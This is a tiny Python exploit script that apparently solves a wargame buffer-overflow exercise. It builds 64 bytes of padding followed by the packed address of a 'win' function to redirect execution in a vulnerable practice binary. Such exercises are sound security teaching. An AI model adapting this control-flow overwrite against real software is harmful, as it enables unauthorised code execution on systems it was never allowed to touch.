#!/usr/bin/python
import struct
padding = "A" * 64
win = struct.pack("I", 0x8048424) #address for win function
print padding + win
